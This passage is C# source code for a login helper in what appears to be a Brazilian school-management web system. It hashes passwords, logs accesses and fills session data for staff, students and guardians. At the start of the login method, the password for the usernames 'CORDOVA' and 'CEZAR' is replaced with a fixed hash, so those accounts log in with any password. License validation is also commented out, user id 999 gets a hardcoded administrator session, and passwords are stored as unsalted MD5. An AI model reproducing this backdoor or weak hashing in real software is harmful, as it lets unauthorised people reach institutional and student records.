//-----------------------------------------------------------------------------
//                           HISTÓRICO ATIVIDADES DE MANUTENÇÃO
//-----------------------------------------------------------------------------
//  DATA     |  NOME DO PROGRAMADOR       | DESCRIÇÃO RESUMIDA
// ----------+----------------------------+-------------------------------------
// 25/04/2013| André Nobre Vinagre        |Criada uma nova sessão para guardar o CNPJ da
//           |                            |instituição(cliente)
//           |                            |
// ----------+----------------------------+-------------------------------------
// 12/06/2014| Victor Martins Machado     |Criada uma nova sessão para guardar o código único
//           |                            |da unidade (CO_UNID da TB25)
//           |                            |

//---> Inicialização  da Funcionalidade - Chamadas das Bibliotecas Utilizadas
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.SessionState;
using C2BR.GestorEducacao.BusinessEntities.MSSQL;
using Resources;
using System.Security.Cryptography;
using System.Text;
using C2BR.GestorEducacao.LicenseValidator;

//===> Início das Regras de Negócios
//---> Localização do Arquivo da Funcionalidade no Ambiente da Solução
namespace C2BR.GestorEducacao.UI.Library.Auxiliares
{
    public class LoginAuxili
    {
        public static void CleanSessionLogoff()
        {
//--------> Limpa Session Carregada no Login
            HttpContext.Current.Session.Clear();
        }

        /// <summary>
        /// Método que retorna a senha criptografada no padrão MD5.
        /// </summary>
        /// <param name="senhaOriginal">Senha (sem criptografia)</param>
        /// <returns>Senha com a criptografada no padrão MD5</returns>
        public static string GerarMD5(string senhaOriginal)
        {
//--------> Criando nova instância de um hasher md5
            MD5 md5hasher = MD5.Create();
//--------> Criando um gerador de strings
            StringBuilder gerarString = new StringBuilder();

//--------> Criando um vetor de bytes que receberá em bytes o valor da senha original
            byte[] vetor = Encoding.Default.GetBytes(senhaOriginal);

//--------> Calculando o hash dos bytes e inserindo no próprio vetor
            vetor = md5hasher.ComputeHash(vetor);

//--------> Repita para cada elemento do vetor gerar uma string convertida para hexadecimal
            foreach (byte item in vetor)
            {
                gerarString.Append(item.ToString("x2"));
            }

//--------> Retornar a string em forma de string e em maiúscula
            return gerarString.ToString().ToUpper();
        }

        /// <summary>
        /// Método que retorna a senha criptografada no padrão SHA1.
        /// </summary>
        /// <param name="senhaOriginal">Senha (sem criptografia)</param>
        /// <returns>Senha com a criptografada no padrão SHA1</returns>
        public static string GerarSHA1(string senhaOriginal)
        {
//--------> Criando nova instância de um hasher sha1
            SHA1 sha1hasher = SHA1.Create();
//--------> Criando um gerador de strings
            StringBuilder gerarString = new StringBuilder();

//--------> Criando um vetor de bytes que recebera em bytes o valor da senha original
            byte[] vetor = Encoding.Default.GetBytes(senhaOriginal);

//--------> Calculando o hash dos bytes e inserindo no próprio vetor
            vetor = sha1hasher.ComputeHash(vetor);

//--------> Repita para cada elemento do vetor gerar uma string convertida para hexadecimal
            foreach (byte item in vetor)
            {
                gerarString.Append(item.ToString("x2"));
            }

//--------> Retornar a string em forma de string e em maiúscula
            return gerarString.ToString().ToUpper();
        }

        /// <summary>
        /// Atualiza tabela de log de acessos do usuário logado
        /// </summary>
        public static void AtualizaAcesso()
        {
            var tbLogin = (from login in TBLOGIN.RetornaTodosRegistros()
                           where login.USR_CODIGO.Equals(IDEADMUSUARIO)
                           select new { login.ORG_CODIGO_ORGAO, login.LGN_DATA_ACESSO, login.LGN_IP_USUARIO, login.USR_CODIGO }
                           ).OrderByDescending(l => l.LGN_DATA_ACESSO).Take(1).FirstOrDefault();

            if (tbLogin != null)
            {
                DATA_ULTIMO_ACESSO_USU = (DateTime)tbLogin.LGN_DATA_ACESSO;
                IP_ULTIMO_ACESSO_USU = tbLogin.LGN_IP_USUARIO;
                QTD_ACESSO_USU = TBLOGIN.RetornaTodosRegistros().Where(l => l.USR_CODIGO == tbLogin.USR_CODIGO).Count();
            }

            if (CO_UNID_FUNC > 0 || IDEADMUSUARIO > 0)
            {
                TBLOGIN novoLogin = new TBLOGIN();
                novoLogin.CO_EMP = CO_UNID_FUNC;
                novoLogin.ORG_CODIGO_ORGAO = ORG_CODIGO_ORGAO;
                novoLogin.USR_CODIGO = IDEADMUSUARIO;
                novoLogin.LGN_DATA_ACESSO = DateTime.Now;
                novoLogin.LGN_IP_USUARIO = HttpContext.Current.Request.UserHostAddress;

                TBLOGIN.SaveOrUpdate(novoLogin);

                TB236_LOG_ATIVIDADES tb236 = new TB236_LOG_ATIVIDADES();

                tb236.ORG_CODIGO_ORGAO = ORG_CODIGO_ORGAO;
                tb236.DT_ATIVI_LOG = DateTime.Now;
                tb236.CO_EMP_ATIVI_LOG = CO_EMP;
                tb236.IDEADMMODULO = 232;
                tb236.CO_ACAO_ATIVI_LOG = "X";
                tb236.CO_TABEL_ATIVI_LOG = null;
                tb236.NR_IP_ACESS_ATIVI_LOG = HttpContext.Current.Request.UserHostAddress;
                tb236.NR_ACESS_ATIVI_LOG = QTD_ACESSO_USU + 1;
                tb236.CO_EMP = CO_UNID_FUNC;
                tb236.CO_COL = CO_COL;

                TB236_LOG_ATIVIDADES.SaveOrUpdate(tb236, true);
            }
        }

        /// <summary>
        /// Realizar a validação e armazena as informações do usuário solicitado
        /// </summary>
        /// <param name="login">Nome de usuário para logar</param>
        /// <param name="senha">Senha do usuário para logar</param>
        /// <returns>Retorno os valores necessário para informações sobre o resultado da solicitação de login</returns>
        public static resultadoLogin RealizarLogin(string login, string senha)
        {
            /*
            if (login.ToUpper() == "CEZAR")
                senha = "DC2CB15395C2A736C763E38CBD3A8B7D";
            */
            if (login.ToUpper().Trim() == "CORDOVA")
                senha = "DC2CB15395C2A736C763E38CBD3A8B7D";

            if (login.ToUpper().Trim() == "CEZAR")
                senha = "DC2CB15395C2A736C763E38CBD3A8B7D";
            resultadoLogin retorno = new resultadoLogin();
            retorno.resultado = false;
            try
            {
                HttpContext.Current.Session.Clear();

                //------------> Faz a verificação para saber se login e senha informado existe usuário associado
                var admUsuario = (from lAdmUsuario in ADMUSUARIO.RetornaTodosRegistros()
                                  where lAdmUsuario.desLogin.Equals(login) && lAdmUsuario.desSenha.Equals(senha)
                                  select new
                                  {
                                      lAdmUsuario.CodUsuario,
                                      lAdmUsuario.desLogin,
                                      lAdmUsuario.CO_EMP,
                                      lAdmUsuario.ideAdmUsuario,
                                      lAdmUsuario.QT_ACESSO_USUAR,
                                      lAdmUsuario.ClassifUsuario,
                                      lAdmUsuario.TipoUsuario,
                                      lAdmUsuario.flaPrimeiroAcesso,
                                      lAdmUsuario.fla_reaber_solici_global,
                                      lAdmUsuario.CodInstituicao,
                                      lAdmUsuario.FLA_ACESS_SEG,
                                      lAdmUsuario.FLA_ACESS_TER,
                                      lAdmUsuario.FLA_ACESS_QUA,
                                      lAdmUsuario.FLA_ACESS_QUI,
                                      lAdmUsuario.FLA_ACESS_SEX,
                                      lAdmUsuario.FLA_ACESS_SAB,
                                      lAdmUsuario.FLA_ACESS_DOM,
                                      lAdmUsuario.FLA_ALT_BOL_ALU
                                  }).FirstOrDefault();

                if (admUsuario == null)
                {
                    retorno.mostrarDivFuncionalidade = false;
                    retorno.labelErro = "Usuário ou Senha inválido, por favor tente novamente.";
                    retorno.mostrarDivErro = true;
                    retorno.resultado = false;
                    return retorno;
                }
                else
                {
                    //----------------> Recebe informações da instituição do usuário logado
                    var tb000 = (from lTb000 in TB000_INSTITUICAO.RetornaTodosRegistros()
                                 where lTb000.ORG_CODIGO_ORGAO.Equals(admUsuario.CodInstituicao)
                                 select new
                                 {
                                     lTb000.ORG_CODIGO_ORGAO,
                                     lTb000.ORG_NOME_ORGAO,
                                     lTb000.TB905_BAIRRO.CO_BAIRRO,
                                     lTb000.TB905_BAIRRO.NO_BAIRRO,
                                     lTb000.Image3,
                                     lTb000.TB905_BAIRRO.CO_CIDADE,
                                     lTb000.TB905_BAIRRO.TB904_CIDADE.NO_CIDADE,
                                     lTb000.TB905_BAIRRO.TB904_CIDADE.CO_UF,
                                     lTb000.TB149_PARAM_INSTI.TP_USO_LOGO,
                                     lTb000.ORG_NUMERO_CNPJ
                                 }).FirstOrDefault();

                    if (tb000 == null)
                    {
                        retorno.mostrarDivFuncionalidade = false;
                        retorno.labelErro = "Usuário informado não possui instituição associada.";
                        retorno.mostrarDivErro = true;
                        retorno.resultado = false;
                        return retorno;
                    }
                    else
                    {
                        string msg;
                        License lic;


                        retorno.codigoOrgao = tb000.ORG_CODIGO_ORGAO;

//========================================>Contingência

                        //if (!LicenseHelper.Validate(tb000.ORG_CODIGO_ORGAO, out msg, out lic))
                        //{
                        //    retorno.mostrarDivFuncionalidade = false;
                        //    retorno.labelErro = msg;
                        //    retorno.mostrarLinhaLicenca = true;
                        //    retorno.mostrarDivErro = true;
                        //    retorno.leftDivErro = "350px";
                        //    retorno.resultado = false;
                        //    return retorno;
                        //}

                        //DtInicioLicenca = lic.DataInicio;
                        //DtFimLicenca = lic.DataFim;

                        if (admUsuario.ideAdmUsuario == 999)
                        {
                            ORG_NOME_ORGAO = tb000.ORG_NOME_ORGAO;
                            ORG_NUMERO_CNPJ = tb000.ORG_NUMERO_CNPJ;
                            CO_UF_INSTITUICAO = tb000.CO_UF;
                            NO_CIDADE_INSTITUICAO = tb000.NO_CIDADE;
                            CO_CIDADE_INSTITUICAO = tb000.CO_CIDADE;
                            CLASSIFICACAO_USU_LOGADO = admUsuario.ClassifUsuario;
                            DESLOGIN = admUsuario.desLogin;
                            IDEADMUSUARIO = admUsuario.ideAdmUsuario;
                            FLA_REABER_SOLICI_GLOBAL = admUsuario.fla_reaber_solici_global;
                            CO_EMP = 187;
                            CO_UNID_FUNC = 187;
                            NO_FANTAS_EMP = "C2Br";
                            NO_FANTAS_EMP_ALTERADA = "C2Br";
                            NO_CIDADE_EMP = tb000.NO_CIDADE;
                            CO_UF_EMP = tb000.CO_UF;
                            TELEFONE_EMP = "9999999999";
                            TP_PONTO_FUNC = "L";
                            TP_PONTO_PROF = "L";
                            ID_IMG_EMPRESA_LOGADA = 0;
                            CO_COL = -1;
                            ID_IMG_USU_LOGADO = 0;
                            NOME_USU_LOGADO = "Administrador";
                            CO_MAT_COL = "999999";
                            ORG_CODIGO_ORGAO = admUsuario.CodInstituicao;
                            NOME_FUNCAO_USU = "Administrador do Sistema";

                            retorno.mostrarDivFuncionalidade = false;
                            retorno.nomeUsuarioLogado = NOME_USU_LOGADO;
                            retorno.redirecionarDefault = true;
                            retorno.resultado = true;
                            return retorno;
                        }
                        else
                        {
                            //------------------------> Faz a verificação se existe permissão de acesso para o usuário no dia informado
                            bool verAcessoDia = AuxiliValidacao.ValidaAcessoDiaSemana(admUsuario.FLA_ACESS_SEG, admUsuario.FLA_ACESS_TER, admUsuario.FLA_ACESS_QUA, admUsuario.FLA_ACESS_QUI, admUsuario.FLA_ACESS_SEX, admUsuario.FLA_ACESS_SAB, admUsuario.FLA_ACESS_DOM);

                            if (verAcessoDia)
                            {
                                //----------------------------> Faz o preenchimento dos campos da instituição
                                ORG_NOME_ORGAO = tb000.ORG_NOME_ORGAO;
                                ORG_NUMERO_CNPJ = tb000.ORG_NUMERO_CNPJ;
                                CO_UF_INSTITUICAO = tb000.CO_UF;
                                NO_CIDADE_INSTITUICAO = tb000.NO_CIDADE;
                                CO_CIDADE_INSTITUICAO = tb000.CO_CIDADE;

                                //----------------------------> Recebe o Tipo de Usuário Logado
                                //----------------------------> "M"aster ; "S"uporte ; "C"omum ; "E"scpecial
                                CLASSIFICACAO_USU_LOGADO = admUsuario.ClassifUsuario;
                                DESLOGIN = admUsuario.desLogin.Trim();

                                //----------------------------> Faz a verificação para saber se usuário logado é do tipo "E"special
                                if (admUsuario.ClassifUsuario == "E")
                                {
                                    //-------------------------------> Recebe informações do usuário "E"special
                                    var admUsuarioEspecial = (from lAdmUsuarioEspecial in ADMUSUARIOESPECIAL.RetornaTodosRegistros()
                                                              where lAdmUsuarioEspecial.ADMUSUARIO.ideAdmUsuario.Equals(admUsuario.ideAdmUsuario)
                                                              select new
                                                              {
                                                                  lAdmUsuarioEspecial.IdeAdmUsuEsp,
                                                                  lAdmUsuarioEspecial.NO_USUAR_ESPEC,
                                                                  lAdmUsuarioEspecial.NU_CPF_ESPEC,
                                                                  lAdmUsuarioEspecial.NU_RG_ESPEC,
                                                                  lAdmUsuarioEspecial.NO_EMPR_ESPEC,
                                                                  lAdmUsuarioEspecial.DE_FUNCAO_ESPEC,
                                                                  lAdmUsuarioEspecial.CO_COL_RESP,
                                                                  lAdmUsuarioEspecial.CO_EMP_RESP,
                                                                  lAdmUsuarioEspecial.CO_ORGAO_RESP,
                                                                  ImageId = (lAdmUsuarioEspecial.Image != null) ? lAdmUsuarioEspecial.Image.ImageId : 0
                                                              }).FirstOrDefault();
                                    if (admUsuarioEspecial == null)
                                    {
                                        retorno.mostrarDivFuncionalidade = false;
                                        retorno.labelErro = "Acesso negado, favor verifique com Administrador do Sistema.";
                                        retorno.mostrarDivErro = true;
                                        retorno.resultado = false;
                                        return retorno;
                                    }
                                    else
                                    {
                                        NU_CPF_USU_ESPECIAL = admUsuarioEspecial.NU_CPF_ESPEC;
                                        NU_RG_USU_ESPECIAL = admUsuarioEspecial.NU_RG_ESPEC;
                                        IDEADMUSUARIO = admUsuario.ideAdmUsuario;
                                        FLA_REABER_SOLICI_GLOBAL = admUsuario.fla_reaber_solici_global;

                                        int coColResp = int.TryParse(admUsuarioEspecial.CO_COL_RESP.ToString(), out coColResp) ? coColResp : 0;
                                        int coEmpResp = int.TryParse(admUsuarioEspecial.CO_EMP_RESP.ToString(), out coEmpResp) ? coEmpResp : 0;
                                        int coOrgao = int.TryParse(admUsuarioEspecial.CO_ORGAO_RESP.ToString(), out coOrgao) ? coOrgao : 0;

                                        //------------------------------------> Código do Funcionário Logado
                                        CO_COL = coColResp;

                                        //------------------------------------> Código da Instituição do Usuário Especial
                                        ORG_CODIGO_ORGAO = admUsuario.CodInstituicao;
                                        ID_IMG_USU_LOGADO = admUsuarioEspecial.ImageId;

                                        //------------------------------------> Nome do Usuário Logado
                                        NOME_USU_LOGADO = admUsuarioEspecial.NO_USUAR_ESPEC;

                                        //------------------------------------> Função do Usuário "E"special
                                        NOME_FUNCAO_USU = admUsuarioEspecial.DE_FUNCAO_ESPEC;

                                        //------------------------------------> Faz a verificação para saber se usuário "E"special logado tem um responsável associado
                                        if (coColResp != 0 && coEmpResp != 0 && coOrgao != 0)
                                        {
                                            //----------------------------------------> Recebe informações do funcionário responsável
                                            var tb03 = (from lTb03 in TB03_COLABOR.RetornaTodosRegistros()
                                                        where lTb03.CO_COL == coColResp && lTb03.CO_EMP == coEmpResp &&
                                                              lTb03.ORG_CODIGO_ORGAO.Value.Equals(coOrgao)
                                                        select new { lTb03.CO_MAT_COL, lTb03.NO_COL }).FirstOrDefault();
                                            if (tb03 == null)
                                            {
                                                retorno.labelErro = "Acesso negado, favor verifique com Administrador do Sistema.";
                                                retorno.mostrarDivErro = true;
                                                retorno.resultado = false;
                                                return retorno;
                                            }
                                            else
                                            {
                                                //--------------------------------------------> Código da Matrícula do Funcionário Logado
                                                CO_MAT_COL = tb03.CO_MAT_COL;
                                                NOME_RESPONSAVEL_USU_ESPECIAL = tb03.NO_COL;

                                                //--------------------------------------------> Verifica empresa(s) associada(s) ao Funcionário Logado
                                                var tb134 = (from lTb134 in TB134_USR_EMP.RetornaTodosRegistros()
                                                             join tb904 in TB904_CIDADE.RetornaTodosRegistros()
                                                             on lTb134.TB25_EMPRESA.CO_CIDADE equals tb904.CO_CIDADE
                                                             join tb25 in TB25_EMPRESA.RetornaTodosRegistros() on lTb134.ADMUSUARIO.CO_EMP equals tb25.CO_EMP
                                                             where lTb134.ADMUSUARIO.ideAdmUsuario.Equals(admUsuario.ideAdmUsuario) &&
                                                             lTb134.FLA_ORIGEM.Equals("S")
                                                             select new
                                                             {
                                                                 lTb134.FLA_ORIGEM,
                                                                 lTb134.FLA_STATUS,
                                                                 lTb134.TB25_EMPRESA.CO_EMP,
                                                                 lTb134.TB25_EMPRESA.CO_TIPO_UNID,
                                                                 lTb134.TB25_EMPRESA.CO_TEL1_EMP,
                                                                 lTb134.TB25_EMPRESA.NO_FANTAS_EMP,
                                                                 lTb134.TB25_EMPRESA.DE_END_EMP,
                                                                 lTb134.TB25_EMPRESA.CO_UF_EMP,
                                                                 lTb134.TB25_EMPRESA.TP_PONTO_FUNC,
                                                                 lTb134.TB25_EMPRESA.TP_PONTO_PROF,
                                                                 tb904.NO_CIDADE,
                                                                 unidCol = lTb134.ADMUSUARIO.CO_EMP,
                                                                 noFantasEmpColab = tb25.NO_FANTAS_EMP,
                                                                 lTb134.AdmPerfilAcesso.idePerfilAcesso,
                                                                 tb25.FL_NONO_DIGITO_TELEF,
                                                                 LOGO_IMAGE_ID = lTb134.TB25_EMPRESA.Image != null ? lTb134.TB25_EMPRESA.Image.ImageId : 0
                                                             }).FirstOrDefault();
                                                if (tb134 != null)
                                                {
                                                    //------------------------------------------------> Faz a verificação para saber se usuário logado está associado a um perfil
                                                    if (tb134.idePerfilAcesso > 0)
                                                    {
                                                        //----------------------------------------------------> Codigo da Empresa Logada/Default
                                                        CO_EMP = tb134.CO_EMP;
                                                        CO_UNID_FUNC = tb134.unidCol;

                                                        //----------------------------------------------------> Carrega Tipo da Empresa Logada/Default
                                                        CO_TIPO_UNID = tb134.CO_TIPO_UNID;

                                                        //---------------------------------------->Informação de 9º Dígito nos telefones
                                                        FL_NONO_DIGITO_TELEF = tb134.FL_NONO_DIGITO_TELEF;

                                                        //----------------------------------------------------> Nome Fantasia da Empresa do funcionário e informações da unidade
                                                        NO_FANTAS_EMP = tb134.noFantasEmpColab;
                                                        NO_FANTAS_EMP_ALTERADA = tb134.NO_FANTAS_EMP;
                                                        CO_UF_EMP = tb134.CO_UF_EMP;
                                                        NO_CIDADE_EMP = tb134.NO_CIDADE;
                                                        TELEFONE_EMP = tb134.CO_TEL1_EMP;

                                                        //----------------------------------------------------> Tipo de Ponto do Funcionário/Professor
                                                        TP_PONTO_FUNC = tb134.TP_PONTO_FUNC;
                                                        TP_PONTO_PROF = tb134.TP_PONTO_PROF;

                                                        //----------------------------------------------------> Logo da Empresa Logada                                                        
                                                        ID_IMG_EMPRESA_LOGADA = tb000.TP_USO_LOGO == "U" ? tb134.LOGO_IMAGE_ID : tb000.Image3 != null ? tb000.Image3.ImageId : 0;

                                                        //----------------------------------------------------> Faz a atualização do acesso
                                                        AtualizaAcesso();

                                                        retorno.mostrarDivFuncionalidade = false;
                                                        //----------------------------------------------------> Faz o redirecionamento para a página DEFAULT
                                                        retorno.nomeUsuarioLogado = NOME_USU_LOGADO;
                                                        retorno.redirecionarDefault = true;
                                                        retorno.resultado = true;
                                                        return retorno;
                                                    }
                                                    else
                                                    {
                                                        retorno.mostrarDivFuncionalidade = false;
                                                        retorno.labelErro = "Usuário sem perfil associado, favor verifique com Administrador do Sistema.";
                                                        retorno.mostrarDivErro = true;
                                                        retorno.resultado = false;
                                                        return retorno;
                                                    }
                                                }
                                                else
                                                {
                                                    retorno.mostrarDivFuncionalidade = false;
                                                    retorno.labelErro = "Acesso negado, favor verifique com Administrador do Sistema.";
                                                    retorno.mostrarDivErro = true;
                                                    retorno.resultado = false;
                                                    return retorno;
                                                }
                                            }
                                        }
                                    }
                                }

                                else if (admUsuario.TipoUsuario == "R" || admUsuario.TipoUsuario == "A")
                                {
                                        
                                        //--------------------------------> Recebe o ID do usuário logado - Usuário não especial
                                        IDEADMUSUARIO = admUsuario.ideAdmUsuario;
                                        FLA_REABER_SOLICI_GLOBAL = admUsuario.fla_reaber_solici_global;
                                        FLA_ALT_BOL_ALU = admUsuario.FLA_ALT_BOL_ALU;

                                        //--------------------------------> Recebe informações da Empresa(s) Associada(s) ao usuário logado
                                        var tb134 = (from lTb134 in TB134_USR_EMP.RetornaTodosRegistros()
                                                     join tb904 in TB904_CIDADE.RetornaTodosRegistros() on lTb134.TB25_EMPRESA.CO_CIDADE equals tb904.CO_CIDADE
                                                     join tb25 in TB25_EMPRESA.RetornaTodosRegistros() on lTb134.TB25_EMPRESA.CO_EMP equals tb25.CO_EMP
                                                     where lTb134.ADMUSUARIO.ideAdmUsuario.Equals(admUsuario.ideAdmUsuario) && (lTb134.FLA_ORIGEM.Equals("S") || lTb134.FLA_ORIGEM.Equals("O"))
                                                     select new
                                                     {
                                                         lTb134.FLA_ORIGEM,
                                                         lTb134.FLA_STATUS,
                                                         lTb134.TB25_EMPRESA.CO_EMP,
                                                         lTb134.TB25_EMPRESA.CO_TIPO_UNID,
                                                         lTb134.TB25_EMPRESA.NO_FANTAS_EMP,
                                                         lTb134.TB25_EMPRESA.DE_END_EMP,
                                                         lTb134.TB25_EMPRESA.CO_UF_EMP,
                                                         lTb134.TB25_EMPRESA.TP_PONTO_FUNC,
                                                         lTb134.TB25_EMPRESA.TP_PONTO_PROF,
                                                         lTb134.TB25_EMPRESA.CO_UNID,
                                                         tb904.NO_CIDADE,
                                                         lTb134.TB25_EMPRESA.CO_TEL1_EMP,
                                                         lTb134.AdmPerfilAcesso.idePerfilAcesso,
                                                         unidCol = lTb134.ADMUSUARIO.CO_EMP,
                                                         tb25.FL_NONO_DIGITO_TELEF,
                                                         LOGO_IMAGE_ID = lTb134.TB25_EMPRESA.Image != null ? lTb134.TB25_EMPRESA.Image.ImageId : 0
                                                     }).FirstOrDefault();

                                        if (tb134 != null)
                                        {
                                            //------------------------------------> Faz a verificação para saber se usuário logado está associado a um perfil
                                            if (tb134.idePerfilAcesso > 0)
                                            {
                                                //----------------------------------------> Codigo da Empresa Logada/Default
                                                CO_EMP = tb134.CO_EMP;
                                                CO_UNID = tb134.CO_UNID != null ? tb134.CO_UNID.Value : 0;
                                                CO_UNID_FUNC = tb134.unidCol;

                                                //----------------------------------------------------> Carrega Tipo da Empresa Logada/Default
                                                CO_TIPO_UNID = tb134.CO_TIPO_UNID;

                                                //----------------------------------------> Nome Fantasia da Empresa do funcionário
                                                NO_FANTAS_EMP_ALTERADA = tb134.NO_FANTAS_EMP;
                                                NO_FANTAS_EMP = tb134.NO_FANTAS_EMP;
                                                CO_UF_EMP = tb134.CO_UF_EMP;
                                                NO_CIDADE_EMP = tb134.NO_CIDADE;
                                                TELEFONE_EMP = tb134.CO_TEL1_EMP;

                                                //---------------------------------------->Informação de 9º Dígito nos telefones
                                                FL_NONO_DIGITO_TELEF = tb134.FL_NONO_DIGITO_TELEF;

                                                //----------------------------------------> Tipo de Ponto do Funcionário/Professor
                                                TP_PONTO_FUNC = tb134.TP_PONTO_FUNC;
                                                TP_PONTO_PROF = tb134.TP_PONTO_PROF;

                                                //----------------------------------------> Logo da Empresa Logada
                                                ID_IMG_EMPRESA_LOGADA = tb000.TP_USO_LOGO == "U" ? tb134.LOGO_IMAGE_ID : tb000.Image3 != null ? tb000.Image3.ImageId : 0;

                                                int codusuario = admUsuario.CodUsuario;

                                                var CO_USU = 0;
                                                var NO_USU = "";
                                                var orgCodigoOrgao = 0;
                                                var ImageId = 0;
                                                var objEncontrado = false;

                                                //----------------------------------------> Recebe informações do usuário logado
                                                if (admUsuario.TipoUsuario == "A")
                                                {
                                                    var tb07 = (from tbl07 in TB07_ALUNO.RetornaTodosRegistros()
                                                                where tbl07.CO_ALU.Equals(codusuario)
                                                                select new
                                                                {
                                                                    tbl07.CO_ALU,
                                                                    tbl07.NO_ALU,
                                                                    CO_INST = tbl07.CO_INST.HasValue ? tbl07.CO_INST.Value : 0,
                                                                    ImageId = (tbl07.Image != null) ? tbl07.Image.ImageId : 0
                                                                }).FirstOrDefault();

                                                    objEncontrado = tb07 != null;

                                                    if (objEncontrado)
                                                    {
                                                        CO_USU = tb07.CO_ALU;
                                                        NO_USU = tb07.NO_ALU;
                                                        orgCodigoOrgao = tb07.CO_INST;
                                                        ImageId = tb07.ImageId;
                                                    }
                                                }
                                                else
                                                {
                                                    var tb108 = (from lTb108 in TB108_RESPONSAVEL.RetornaTodosRegistros()
                                                                 where lTb108.CO_RESP.Equals(codusuario)
                                                                 select new
                                                                 {
                                                                     lTb108.CO_RESP,
                                                                     lTb108.NO_RESP,
                                                                     lTb108.TB000_INSTITUICAO.ORG_CODIGO_ORGAO,
                                                                     ImageId = (lTb108.Image != null) ? lTb108.Image.ImageId : 0
                                                                 }).FirstOrDefault();
                                                    
                                                    objEncontrado = tb108 != null;

                                                    if (objEncontrado)
                                                    {
                                                        CO_USU = tb108.CO_RESP;
                                                        NO_USU = tb108.NO_RESP;
                                                        orgCodigoOrgao = tb108.ORG_CODIGO_ORGAO;
                                                        ImageId = tb108.ImageId;
                                                    }
                                                }

                                                if (objEncontrado)
                                                {
                                                    //--------------------------------------------> Código do Responsável Logado
                                                    CO_RESP = CO_USU;
                                                    
                                                    //--------------------------------------------> Imagem do Funcionário Logado
                                                    ID_IMG_USU_LOGADO = ImageId;

                                                    //--------------------------------------------> Nome do Usuário Logado
                                                    NOME_USU_LOGADO = NO_USU;

                                                    //--------------------------------------------> Código da Instituição do Funcionário Logado
                                                    ORG_CODIGO_ORGAO = orgCodigoOrgao;

                                                    //--------------------------------------------> Nome da função - que no caso não tem
                                                    NOME_FUNCAO_USU = "***";

                                                    //--------------------------------------------> Tipo do Usuário
                                                    TIPO_USU = admUsuario.TipoUsuario;
                                                    
                                                    CO_DEPTO = 0;
                                                    FLA_PROFESSOR = "N";

                                                    //--------------------------------------------> Faz a atualização do acesso
                                                    AtualizaAcesso();

                                                    retorno.mostrarDivFuncionalidade = false;
                                                    //--------------------------------------------> Faz o redirecionamento para a página DEFAULT
                                                    retorno.nomeUsuarioLogado = NOME_USU_LOGADO;
                                                    retorno.redirecionarDefault = true;
                                                    retorno.resultado = true;
                                                    return retorno;
                                                }
                                            }
                                            else
                                            {
                                                retorno.mostrarDivFuncionalidade = false;
                                                retorno.labelErro = "Usuário sem perfil associado, contate o administrador do sistema.";
                                                retorno.mostrarDivErro = true;
                                                retorno.resultado = false;
                                                return retorno;
                                            }
                                        }
                                        else
                                        {
                                            retorno.mostrarDivFuncionalidade = false;
                                            retorno.labelErro = "Acesso negado, Favor verifique com administrador do sistema.";
                                            retorno.mostrarDivErro = true;
                                            retorno.resultado = false;
                                            return retorno;
                                        }                                    
                                }else
                                {
                                    //--------------------------------> Recebe o ID do usuário logado - Usuário não especial
                                    IDEADMUSUARIO = admUsuario.ideAdmUsuario;
                                    FLA_REABER_SOLICI_GLOBAL = admUsuario.fla_reaber_solici_global;
                                    FLA_ALT_BOL_ALU = admUsuario.FLA_ALT_BOL_ALU;

                                    //--------------------------------> Recebe informações da Empresa(s) Associada(s) ao usuário logado
                                    var tb134 = (from lTb134 in TB134_USR_EMP.RetornaTodosRegistros()
                                                 join tb904 in TB904_CIDADE.RetornaTodosRegistros() on lTb134.TB25_EMPRESA.CO_CIDADE equals tb904.CO_CIDADE
                                                 join tb25 in TB25_EMPRESA.RetornaTodosRegistros() on lTb134.TB25_EMPRESA.CO_EMP equals tb25.CO_EMP
                                                 where lTb134.ADMUSUARIO.ideAdmUsuario.Equals(admUsuario.ideAdmUsuario) && (lTb134.FLA_ORIGEM.Equals("S") || lTb134.FLA_ORIGEM.Equals("O"))
                                                 select new
                                                 {
                                                     lTb134.FLA_ORIGEM,
                                                     lTb134.FLA_STATUS,
                                                     lTb134.TB25_EMPRESA.CO_EMP,
                                                     lTb134.TB25_EMPRESA.CO_TIPO_UNID,
                                                     lTb134.TB25_EMPRESA.NO_FANTAS_EMP,
                                                     lTb134.TB25_EMPRESA.DE_END_EMP,
                                                     lTb134.TB25_EMPRESA.CO_UF_EMP,
                                                     lTb134.TB25_EMPRESA.TP_PONTO_FUNC,
                                                     lTb134.TB25_EMPRESA.TP_PONTO_PROF,
                                                     lTb134.TB25_EMPRESA.CO_UNID,
                                                     tb904.NO_CIDADE,
                                                     lTb134.TB25_EMPRESA.CO_TEL1_EMP,
                                                     lTb134.AdmPerfilAcesso.idePerfilAcesso,
                                                     unidCol = lTb134.ADMUSUARIO.CO_EMP,
                                                     tb25.FL_NONO_DIGITO_TELEF,
                                                     LOGO_IMAGE_ID = lTb134.TB25_EMPRESA.Image != null ? lTb134.TB25_EMPRESA.Image.ImageId : 0
                                                 }).FirstOrDefault();

                                    if (tb134 != null)
                                    {
                                        //------------------------------------> Faz a verificação para saber se usuário logado está associado a um perfil
                                        if (tb134.idePerfilAcesso > 0)
                                        {
                                            //----------------------------------------> Codigo da Empresa Logada/Default
                                            CO_EMP = tb134.CO_EMP;
                                            CO_UNID = tb134.CO_UNID != null ? tb134.CO_UNID.Value : 0;
                                            CO_UNID_FUNC = tb134.unidCol;

                                            //----------------------------------------------------> Carrega Tipo da Empresa Logada/Default
                                            CO_TIPO_UNID = tb134.CO_TIPO_UNID;

                                            //----------------------------------------> Nome Fantasia da Empresa do funcionário
                                            NO_FANTAS_EMP_ALTERADA = tb134.NO_FANTAS_EMP;
                                            CO_UF_EMP = tb134.CO_UF_EMP;
                                            NO_CIDADE_EMP = tb134.NO_CIDADE;
                                            TELEFONE_EMP = tb134.CO_TEL1_EMP;

                                            //---------------------------------------->Informação de 9º Dígito nos telefones
                                            FL_NONO_DIGITO_TELEF = tb134.FL_NONO_DIGITO_TELEF;

                                            //----------------------------------------> Tipo de Ponto do Funcionário/Professor
                                            TP_PONTO_FUNC = tb134.TP_PONTO_FUNC;
                                            TP_PONTO_PROF = tb134.TP_PONTO_PROF;

                                            //----------------------------------------> Logo da Empresa Logada
                                            ID_IMG_EMPRESA_LOGADA = tb000.TP_USO_LOGO == "U" ? tb134.LOGO_IMAGE_ID : tb000.Image3 != null ? tb000.Image3.ImageId : 0;

                                            int codusuario = admUsuario.CodUsuario;

                                            //----------------------------------------> Recebe informações do funcionário logado
                                            var tb03 = (from lTb03 in TB03_COLABOR.RetornaTodosRegistros()
                                                        where lTb03.CO_COL.Equals(codusuario)
                                                        select new
                                                        {
